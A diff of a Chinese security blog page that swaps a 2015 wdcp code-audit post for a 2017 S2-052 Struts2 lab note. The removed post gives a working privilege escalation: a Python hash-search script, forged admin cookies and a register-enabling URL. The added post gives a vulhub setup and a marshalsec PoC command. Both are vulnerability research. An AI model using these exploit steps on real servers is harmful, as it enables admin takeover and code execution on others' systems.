@@ -4,45 +4,45 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>代码审计之wdcp多处漏洞 | xd_xd&#39;s blog</title>
+    <title>S2-052简单测试 | xd_xd&#39;s blog</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="xd_xd">
     
 
     
-    <meta name="description" content="之前wdcp出过一个伪造用户登录的漏洞，做了一些分析。看了一些修复后的代码，发现逻辑还是不够严谨。当开启了注册功能的时候，可以直接注册管理员用户，从而获得控制权。目前官方已经发布补丁。
-
-#漏洞影响
-影响开启了注册了wdcp系统。主要开启了注册。即可通过特定手段注册一个具有超级管理员权限的用户。或得wdcp系统的完全的管理权限。
-#代码分析
-分析版本为最新版2.5.10
-login.php文件
-i">
+    <meta name="description" content="漏洞公告
+测试环境网上公开比较早的是CSDN的这个博客。不过很快删掉了。由于有快照，网上也出现了很多转载。
+测试环境使用vulhub。直接使用048的测试环境，替换成新的app就可以。docker-compose.yml如下：
+version: &apos;2&apos;
+services:
+ struts2:
+   image: vulhub/struts2:2.3.32-showcase
+   volumes:">
 <meta property="og:type" content="article">
-<meta property="og:title" content="代码审计之wdcp多处漏洞">
-<meta property="og:url" content="http://xdxd.love/2015/06/05/代码审计之wdcp多处漏洞/index.html">
+<meta property="og:title" content="S2-052简单测试">
+<meta property="og:url" content="http://xdxd.love/2017/09/07/S2-052简单测试/index.html">
 <meta property="og:site_name" content="xd_xd's blog">
-<meta property="og:description" content="之前wdcp出过一个伪造用户登录的漏洞，做了一些分析。看了一些修复后的代码，发现逻辑还是不够严谨。当开启了注册功能的时候，可以直接注册管理员用户，从而获得控制权。目前官方已经发布补丁。
-
-#漏洞影响
-影响开启了注册了wdcp系统。主要开启了注册。即可通过特定手段注册一个具有超级管理员权限的用户。或得wdcp系统的完全的管理权限。
-#代码分析
-分析版本为最新版2.5.10
-login.php文件
-i">
-<meta property="og:image" content="http://xdxd.love/images/wdcp1.png">
-<meta property="og:updated_time" content="2015-11-24T03:27:38.000Z">
+<meta property="og:description" content="漏洞公告
+测试环境网上公开比较早的是CSDN的这个博客。不过很快删掉了。由于有快照，网上也出现了很多转载。
+测试环境使用vulhub。直接使用048的测试环境，替换成新的app就可以。docker-compose.yml如下：
+version: &apos;2&apos;
+services:
+ struts2:
+   image: vulhub/struts2:2.3.32-showcase
+   volumes:">
+<meta property="og:image" content="http://xdxd.love/images/s20521.png">
+<meta property="og:updated_time" content="2017-09-07T02:43:36.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="代码审计之wdcp多处漏洞">
-<meta name="twitter:description" content="之前wdcp出过一个伪造用户登录的漏洞，做了一些分析。看了一些修复后的代码，发现逻辑还是不够严谨。当开启了注册功能的时候，可以直接注册管理员用户，从而获得控制权。目前官方已经发布补丁。
-
-#漏洞影响
-影响开启了注册了wdcp系统。主要开启了注册。即可通过特定手段注册一个具有超级管理员权限的用户。或得wdcp系统的完全的管理权限。
-#代码分析
-分析版本为最新版2.5.10
-login.php文件
-i">
+<meta name="twitter:title" content="S2-052简单测试">
+<meta name="twitter:description" content="漏洞公告
+测试环境网上公开比较早的是CSDN的这个博客。不过很快删掉了。由于有快照，网上也出现了很多转载。
+测试环境使用vulhub。直接使用048的测试环境，替换成新的app就可以。docker-compose.yml如下：
+version: &apos;2&apos;
+services:
+ struts2:
+   image: vulhub/struts2:2.3.32-showcase
+   volumes:">
 
     
     <link rel="alternative" href="/atom.xml" title="xd_xd&#39;s blog" type="application/atom+xml">
@@ -102,14 +102,14 @@ i">
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2015/06/05/代码审计之wdcp多处漏洞/" title="代码审计之wdcp多处漏洞" itemprop="url">代码审计之wdcp多处漏洞</a>
+      <a href="/2017/09/07/S2-052简单测试/" title="S2-052简单测试" itemprop="url">S2-052简单测试</a>
   </h1>
   <p class="article-author">By
        
 		<a href="/about" title="xd_xd" target="_blank" itemprop="author">xd_xd</a>
 		
   <p class="article-time">
-    <time datetime="2015-06-05T03:41:49.000Z" itemprop="datePublished"> 發表於 Jun 5 2015</time>
+    <time datetime="2017-09-07T01:54:50.000Z" itemprop="datePublished"> 發表於 Sep 7 2017</time>
     
   </p>
 </header>
@@ -118,126 +118,35 @@ i">
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">文章目錄</strong>
 		
-			
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞公告"><span class="toc-number">1.</span> <span class="toc-text">漏洞公告</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#测试环境"><span class="toc-number">2.</span> <span class="toc-text">测试环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#marshalsec"><span class="toc-number">3.</span> <span class="toc-text">marshalsec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考资料"><span class="toc-number">4.</span> <span class="toc-text">参考资料</span></a></li></ol>
 		
 		</div>
 		
-		<p>之前wdcp出过一个<a href="http://stayliv3.github.io/2015/05/27/wdcp%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" target="_blank" rel="external">伪造用户登录的漏洞</a>，做了一些分析。看了一些修复后的代码，发现逻辑还是不够严谨。当开启了注册功能的时候，可以直接注册管理员用户，从而获得控制权。目前官方已经发布<a href="http://www.wdlinux.cn/bbs/thread-38460-1-1.html" target="_blank" rel="external">补丁</a>。</p>
-<p><img src="/images/wdcp1.png" alt=""></p>
-<p>#漏洞影响</p>
-<p>影响开启了注册了wdcp系统。主要开启了注册。即可通过特定手段注册一个具有超级管理员权限的用户。或得wdcp系统的完全的管理权限。</p>
-<p>#代码分析</p>
-<p>分析版本为最新版2.5.10</p>
-<p>login.php文件</p>
-<pre><code><span class="keyword">if</span> (isset($_SESSION[<span class="string">'is_l'</span>])) {
-    <span class="variable">$wdcp</span>_user=$_COOKIE[<span class="string">'wdcp_user'</span>];
-    <span class="variable">$wdcp</span>_uid=$_COOKIE[<span class="string">'wdcp_uid'</span>];
-    <span class="variable">$wdcp</span>_gid=$_COOKIE[<span class="string">'wdcp_gid'</span>];
-    <span class="variable">$wdcp</span>_ggid=$_COOKIE[<span class="string">'wdcp_ggid'</span>];
-    <span class="variable">$wdcp</span>_us=$_COOKIE[<span class="string">'wdcp_us'</span>];
-    //<span class="variable">$wdcp</span>_lt=$_COOKIE[<span class="string">'wdcp_lt'</span>];
-    //session_start();
-    //print_r($_SESSION);
-    <span class="variable">$wdcp</span>_lt=$_SESSION[<span class="string">'is_l'</span>];
-    /*
-    if (empty($_COOKIE[<span class="string">"wdcp_gid"</span>])) { //<span class="number">20130513</span>
-        <span class="variable">$wdcp</span>_user=$_SESSION[<span class="string">'wdcp_user'</span>];
-        <span class="variable">$wdcp</span>_uid=$_SESSION[<span class="string">'wdcp_uid'</span>];
-        <span class="variable">$wdcp</span>_gid=$_SESSION[<span class="string">'wdcp_gid'</span>];
-        <span class="variable">$wdcp</span>_ggid=$_SESSION[<span class="string">'wdcp_ggid'</span>];
-        <span class="variable">$wdcp</span>_us=$_SESSION[<span class="string">'wdcp_us'</span>];
-    }
-    */
-
-    //echo <span class="string">"wdcp_lt:"</span>.<span class="variable">$wdcp</span>_lt;echo <span class="string">"&lt;br&gt;"</span>;
-    user_l_check(<span class="variable">$wdcp</span>_lt);
-</code></pre><p>判断了$_session[‘is_l’]是否存在。这里其实是修复了之前的cookie欺骗漏洞。跟踪一下$_session[‘is_l’]来源：</p>
-<pre><code><span class="variable">$wdcp</span>_lt=user_l_check(<span class="number">0</span>);
-//setcookie(<span class="string">'wdcp_lt'</span>,<span class="variable">$wdcp</span>_lt,time() + <span class="variable">$cookie</span>_time,<span class="string">'/'</span>);
-//<span class="keyword">if</span> (<span class="variable">$r</span>[<span class="string">'gid'</span>]==<span class="number">1</span>) {
-    //session_start();
-    unset($_SESSION[<span class="string">'is_l'</span>]);
-    $_SESSION[<span class="string">'is_l'</span>]=<span class="variable">$wdcp</span>_lt;
-</code></pre><p>$_session[‘is_l’]session中的is_l字段是来自于user_l_check(0)的返回值。跟进该函数：</p>
-<pre><code><span class="keyword">function</span> user_l_check(<span class="variable">$ul</span>_str=<span class="number">0</span>) {
-    global <span class="variable">$wdcp</span>_user,<span class="variable">$wdcp</span>_uid,<span class="variable">$wdcp</span>_gid,<span class="variable">$wdcp</span>_us;
-    <span class="variable">$str</span>=substr(md5(<span class="variable">$wdcp</span>_user.<span class="variable">$wdcp</span>_uid),<span class="number">8</span>,<span class="number">6</span>);
-    //echo <span class="variable">$str</span>.<span class="string">"&lt;br&gt;"</span>;
-    if (<span class="variable">$ul</span>_str==<span class="number">0</span>) {
-        //echo <span class="variable">$str</span>;
-        //echo <span class="variable">$str</span>.<span class="string">"&lt;br&gt;"</span>;
-        //<span class="variable">$msg</span>=<span class="variable">$str</span>.<span class="string">"|"</span>.<span class="variable">$wdcp</span>_user.<span class="string">"|"</span>.<span class="variable">$wdcp</span>_uid.<span class="string">"|"</span>.<span class="variable">$wdcp</span>_gid.<span class="string">"|"</span>.<span class="variable">$wdcp</span>_us;
-        //file_put_contents(WD_ROOT.<span class="string">"/data/1.txt"</span>,<span class="variable">$msg</span>);
-        return md5(<span class="variable">$str</span>.<span class="variable">$wdcp</span>_user.<span class="variable">$wdcp</span>_uid.<span class="variable">$wdcp</span>_gid.<span class="variable">$wdcp</span>_us);
-    }else {
-        //echo ;
-        //echo <span class="variable">$str</span>.<span class="string">"&lt;br&gt;"</span>;
-        //echo <span class="variable">$str</span>.<span class="string">"|"</span>.<span class="variable">$wdcp</span>_user.<span class="string">"|"</span>.<span class="variable">$wdcp</span>_uid.<span class="string">"|"</span>.<span class="variable">$wdcp</span>_gid.<span class="string">"|"</span>.<span class="variable">$wdcp</span>_us.<span class="string">"   2&lt;br&gt;"</span>;
-        //<span class="variable">$msg</span>=<span class="variable">$str</span>.<span class="string">"|"</span>.<span class="variable">$wdcp</span>_user.<span class="string">"|"</span>.<span class="variable">$wdcp</span>_uid.<span class="string">"|"</span>.<span class="variable">$wdcp</span>_gid.<span class="string">"|"</span>.<span class="variable">$wdcp</span>_us;
-        //file_put_contents(WD_ROOT.<span class="string">"/data/2.txt"</span>,<span class="variable">$msg</span>);
-        <span class="variable">$s1</span>=md5(<span class="variable">$str</span>.<span class="variable">$wdcp</span>_user.<span class="variable">$wdcp</span>_uid.<span class="variable">$wdcp</span>_gid.<span class="variable">$wdcp</span>_us);
-        //echo <span class="string">"1:"</span>.<span class="variable">$ul</span>_str.<span class="string">"|"</span>.<span class="variable">$s1</span>.<span class="string">"&lt;br&gt;"</span>;//exit;
-        //file_put_contents(WD_ROOT.<span class="string">"/data/3.txt"</span>,<span class="variable">$ul</span>_str);
-        //file_put_contents(WD_ROOT.<span class="string">"/data/4.txt"</span>,<span class="variable">$s1</span>);
-        if (strcmp(<span class="variable">$ul</span>_str,<span class="variable">$s1</span>)!=<span class="number">0</span>) {
-            del_cookie();
-            //echo <span class="string">"login err"</span>;
-            //str_go_url(<span class="string">"登录超时!"</span>,<span class="number">1</span>);
-            //exit;
-            echo <span class="string">'&lt;script language="javascript"&gt;alert("登录超时!");parent.location="/"&lt;/script&gt;'</span>;exit;
-            //go_back(<span class="string">"登录信息错误!"</span>);
-        }
-    }
-    return true;
-}
-</code></pre><p>如果传入参数为0，则计算出一个md5值。如果传入参数不为零，则把cookie中的值再进行一次相同的md5计算，跟session中的比较，避免cookie欺骗。 </p>
-<p>这里存在的问题就是if ($ul_str==0)，由于php弱类型的特性。 ‘0a’ == 0 结果是True。所以，如果注册一个用户，该用户的$_session[‘is_l’]这个md5值是类似于’0aslkdjflskjdflsldsdfsdf’ 这种形式，就可以绕过cookie检查，直接return。进入到后面的程序逻辑中。</p>
-<p>根据$_session[‘is_l’]的计算方法。写了一个python脚本：</p>
-<pre><code><span class="keyword">import</span> hashlib
-
-
-
-<span class="keyword">for</span> i in range(<span class="number">1000</span>,<span class="number">1099</span>):
-    uid = <span class="number">5</span>
-    md5_data = hashlib.md5(<span class="built_in">str</span>(i)+<span class="built_in">str</span>(uid)).hexdigest()
-    # <span class="built_in">print</span> md5
-    # <span class="built_in">print</span> md5[<span class="number">8</span>:<span class="number">9</span>]
-    md5_data2 = hashlib.md5(md5_data[<span class="number">8</span>:<span class="number">14</span>] + <span class="built_in">str</span>(i) + <span class="built_in">str</span>(uid) + <span class="string">'10'</span> +<span class="string">'2'</span>).hexdigest()
-    <span class="keyword">if</span>  md5_data2[:<span class="number">1</span>] == <span class="string">'0'</span> and md5_data2[<span class="number">1</span>:<span class="number">2</span>].isdigit() == False: 
-        <span class="built_in">print</span> md5_data2
-        <span class="built_in">print</span> i
-</code></pre><p>这里uid=5，uid是递增的，可以预测。其他的参数都是固定的比如gid是10。计算结果：</p>
-<pre><code>➜  pentest  python wdcp.py
-<span class="number">0</span>c8affdaefae4f2420e9782c9307f4c9
-<span class="number">1003</span>
-<span class="number">0</span>cc72de60b257d2d7e7bdcacd988dfb7
-<span class="number">1066</span>
-</code></pre><p>还是非常容易的。这里省略了很多。以1066为用户名注册用户。登录之后，修改cookie</p>
-<pre><code>PHPSESSID=<span class="number">7f</span>998efdf6fd84f5f7452e2ed470ae0c; wdcp_user=<span class="number">9995</span>; wdcp_uid=<span class="number">5</span>; wdcp_gid=<span class="number">10</span>; wdcp_ggid=<span class="number">10</span>; wdcp_us=<span class="number">2</span>
-</code></pre><p>修改为：</p>
-<pre><code>PHPSESSID=<span class="number">7f</span>998efdf6fd84f5f7452e2ed470ae0c; wdcp_user=admin; wdcp_uid=<span class="number">1</span>; wdcp_gid=<span class="number">1</span>; wdcp_ggid=<span class="number">1</span>; wdcp_us=<span class="number">2</span>
-</code></pre><p>即可获得wdcp系统的超级管理员权限。</p>
-<p>#变量覆盖导致注册用户</p>
-<p>由于wdcp默认关闭注册，所以想尝试一下看看有没有漏洞可以开启注册。结果真的找到一个register_global on条件下的变量覆盖，导致可以开启注册。但是由于wdcp自身的php环境和网站的php环境是分开的。而且默认情况下没有开启全局变量。所以导致十分鸡肋。纯碎技术研究了。</p>
-<p>register通过判断变量is_reg是否为1来开启注册功能。但是这个变量没有进行恰当的初始化。</p>
-<pre><code><span class="keyword">if</span> (<span class="variable">$is</span>_reg==<span class="number">0</span>) go_back(<span class="string">"未开放注册"</span>);
-</code></pre><p>默认情况下没有进行初始化，只有点击开启注册并保存之后才会进行初始化。所以，如果register_global on的情况下，可以覆盖变量进行注册。</p>
-<pre><code><span class="string">http:</span><span class="comment">//192.168.199.138/wdcp/register.php?is_reg=1</span>
-</code></pre>  
+		<h2 id="漏洞公告">漏洞公告</h2><p><img src="/images/s20521.png" alt=""></p>
+<h2 id="测试环境">测试环境</h2><p>网上公开比较早的是CSDN的这个博客。<a href="https://github.com/jas502n/St2-052" target="_blank" rel="external">不过很快删掉了</a>。由于有快照，网上也出现了很多转载。</p>
+<p>测试环境使用vulhub。直接使用048的测试环境，替换成新的app就可以。docker-compose.yml如下：</p>
+<pre><code><span class="attribute">version</span>: <span class="string">'2'</span>
+<span class="attribute">services</span>:
+ <span class="attribute">struts2</span>:
+   <span class="attribute">image</span>: vulhub/<span class="attribute">struts2</span>:<span class="number">2.3</span>.<span class="number">32</span>-showcase
+   <span class="attribute">volumes</span>:
+    - ./ROOT.<span class="attribute">war</span>:/usr/local/tomcat/webapps/ROOT.war
+   <span class="attribute">ports</span>:
+    - <span class="string">"8080:8080"</span>
+</code></pre><p>测试用的<a href="http://archive.apache.org/dist/struts/2.3.32/struts-2.3.32-apps.zip" target="_blank" rel="external">app用的2.3.32版本</a></p>
+<h2 id="marshalsec">marshalsec</h2><pre><code>java -cp target/marshalsec-<span class="number">0.0</span>.<span class="number">1</span>-SNAPSHOT-all<span class="class">.jar</span> marshalsec<span class="class">.XStream</span>  ImageIO  touch /tmp/ls
+</code></pre><p>使用marshalsec生成测试poc</p>
+<h2 id="参考资料">参考资料</h2><p><a href="http://xxlegend.com/2017/09/06/S2-052%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%AE%98%E6%96%B9%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD%E6%97%A0%E6%95%88%E9%AA%8C%E8%AF%81/" target="_blank" rel="external">S2-052漏洞分析及官方缓解措施无效验证</a></p>
+  
 	</div>
 		<footer class="article-footer clearfix">
 <div class="article-catetags">
 
 <div class="article-categories">
   <span></span>
-  <a class="article-category-link" href="/categories/代码审计/">代码审计</a>
+  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>
 </div>
 
-
-  <div class="article-tags">
-  
-  <span></span> <a href="/tags/php-wdcp/">php,wdcp</a>
-  </div>
 
 </div>
 
@@ -245,7 +154,7 @@ i">
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="http://xdxd.love/2015/06/05/代码审计之wdcp多处漏洞/" data-title="代码审计之wdcp多处漏洞 | xd_xd&#39;s blog" data-tsina="5256150165" class="share clearfix">
+	  <div data-url="http://xdxd.love/2017/09/07/S2-052简单测试/" data-title="S2-052简单测试 | xd_xd&#39;s blog" data-tsina="5256150165" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -258,19 +167,11 @@ i">
 	
 <nav class="article-nav clearfix">
  
- <div class="prev" >
- <a href="/2015/06/05/代码审计之ecshop低权限用户提权/" title="代码审计之ecshop低权限用户提权">
-  <strong>上一篇：</strong><br/>
-  <span>
-  代码审计之ecshop低权限用户提权</span>
-</a>
-</div>
-
 
 <div class="next">
-<a href="/2015/05/29/thinkphp-SQL注入风险分析/"  title="thinkphp SQL注入风险分析">
+<a href="/2017/09/06/一个简单mips可执行文件分析/"  title="一个简单mips可执行文件分析">
  <strong>下一篇：</strong><br/> 
- <span>thinkphp SQL注入风险分析
+ <span>一个简单mips可执行文件分析
 </span>
 </a>
 </div>
@@ -279,7 +180,7 @@ i">
 
 	
 <section id="comments" class="comment">
-	<div class="ds-thread" data-thread-key="2015/06/05/代码审计之wdcp多处漏洞/" data-title="代码审计之wdcp多处漏洞" data-url="http://xdxd.love/2015/06/05/代码审计之wdcp多处漏洞/"></div>
+	<div class="ds-thread" data-thread-key="2017/09/07/S2-052简单测试/" data-title="S2-052简单测试" data-url="http://xdxd.love/2017/09/07/S2-052简单测试/"></div>
 </section>
 
 
@@ -289,7 +190,7 @@ i">
   <div id="toc" class="toc-aside">
   <strong class="toc-title">文章目錄</strong>
  
- 
+ <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞公告"><span class="toc-number">1.</span> <span class="toc-text">漏洞公告</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#测试环境"><span class="toc-number">2.</span> <span class="toc-text">测试环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#marshalsec"><span class="toc-number">3.</span> <span class="toc-text">marshalsec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考资料"><span class="toc-number">4.</span> <span class="toc-text">参考资料</span></a></li></ol>
  
   </div>
 
